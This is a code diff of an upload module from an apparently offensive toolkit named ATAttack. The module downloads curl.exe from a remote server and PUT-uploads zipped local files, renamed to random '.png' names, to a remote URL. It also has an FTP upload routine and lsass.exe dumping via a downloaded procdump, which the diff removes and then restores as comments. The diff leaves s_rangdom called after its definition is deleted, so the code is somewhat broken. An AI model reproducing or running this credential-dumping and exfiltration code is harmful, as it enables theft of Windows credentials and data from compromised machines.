@@ -2,8 +2,6 @@
 # -*- coding:UTF-8 -*-
 
 import pyminizip
-import random
-import string
 import socket
 import zipfile
 import platform
@@ -13,10 +11,6 @@ import requests
 from ATAttack.framework.prints import *
 from ATAttack.framework.constant import constant
 import os
-
-
-def s_rangdom():
-    return ''.join(random.sample(string.ascii_letters + string.digits,8))
 
 random_exe = s_rangdom() + ".exe"
 random_zip = s_rangdom() + "_" + ".zip"
@@ -57,7 +51,11 @@ class upload(object):
             pass
 
     def encrypt(self,dirpath):
-
+        '''
+        压缩包加密
+        :param dirpath:
+        :return:
+        '''
         self.zipDir(dirpath, random_zip)
         compression_level = 9
         filename = random_zip
@@ -75,7 +73,7 @@ class upload(object):
         """
         try:
             if not os.path.exists('curl.exe') :
-                self.curl(url='http://119.29.205.214/curl.exe')
+                self.HTTPdownload(constant.curl_url, "curl.exe")
             command = 'curl.exe -X PUT --upload-file {localfile} {url}/{remotefile}'.format(
                 localfile=localfile, url=url, remotefile=s_rangdom()+ ".png")
             print command
@@ -105,14 +103,6 @@ class upload(object):
         fsize = fsize / float(1024 * 1024)
         return round(fsize, 2)
 
-    def curl(self,url, filename='curl.exe'):
-        if os.path.exists(filename):
-            pass
-        else:
-            file = self.HTTPdownload(url, filename)
-            if self.get_FileSize(file) != 0:
-                print "[+] Download successful curl.exe"
-
     def ftp_upload(self,file_remote):
         '''
         ftp上传接口
@@ -120,15 +110,6 @@ class upload(object):
         :return:
         '''
         try:
-            # if os.path.getsize(constant.dump_name) == 0:
-            #     print_error(
-            #         'Export failed. Attempt to download procdump export remotely')
-            #     print_error("Try procdump export again")
-            #     file_exe = self.download(constant.lsass_name, random_exe)
-            #     # file_path = os.path.join(os.getcwd() + "\\" + constant.dump_name)
-            #     os.popen(file_exe +" -accepteula -ma lsass.exe " +constant.dump_name)
-            #     os.remove(random_exe)
-            #     print_success('Successfully exported lsass.exe process')
             file_local = file_remote
             bufsize = 1024
             fp = open(file_local, 'rb')
@@ -149,32 +130,22 @@ class upload(object):
         except Exception:
             return False
 
-    def lsass_dump(self):
-        try:
-            print_error(
-                'Export failed. Attempt to download procdump export remotely')
-            print_error("Try procdump export again")
-            file_exe = self.download(constant.lsass_name, random_exe)
-            # file_path = os.path.join(os.getcwd() + "\\" + constant.dump_name)
-            os.popen(file_exe +" -accepteula -ma lsass.exe " +
-                constant.dump_name)
-            os.remove(random_exe)
-            print_success('Successfully exported lsass.exe process')
-            # dump = zipfile.ZipFile(random_zip, 'w', zipfile.ZIP_DEFLATED)
-            # dump.write(file_path, constant.dump_name)
-            # dump.close()
-            # ftp_upload(random_zip)
-            # os.remove(constant.dump_name)
-            # os.remove(file_exe)
-        except Exception:
-            print_error("Export lsass.exe failed")
-
-    # def navicatpwd(self):
-    #
-    #     self.download(constant.Navicat, random_exe)
-    #     print_success("Successful Access to Navicat Password : ")
-    #     if os.path.getsize(random_exe) == 0:
+    # def lsass_dump(self):
+    #     try:
+    #         print_error(
+    #             'Export failed. Attempt to download procdump export remotely')
+    #         print_error("Try procdump export again")
+    #         file_exe = self.download(constant.lsass_name, random_exe)
+    #         # file_path = os.path.join(os.getcwd() + "\\" + constant.dump_name)
+    #         os.popen(file_exe +" -accepteula -ma lsass.exe " +
+    #             constant.dump_name)
     #         os.remove(random_exe)
-    #     else:
-    #         print_success(os.popen(random_exe).read())
-    #         os.remove(random_exe)
+    #         print_success('Successfully exported lsass.exe process')
+    #         # dump = zipfile.ZipFile(random_zip, 'w', zipfile.ZIP_DEFLATED)
+    #         # dump.write(file_path, constant.dump_name)
+    #         # dump.close()
+    #         # ftp_upload(random_zip)
+    #         # os.remove(constant.dump_name)
+    #         # os.remove(file_exe)
+    #     except Exception:
+    #         print_error("Export lsass.exe failed")
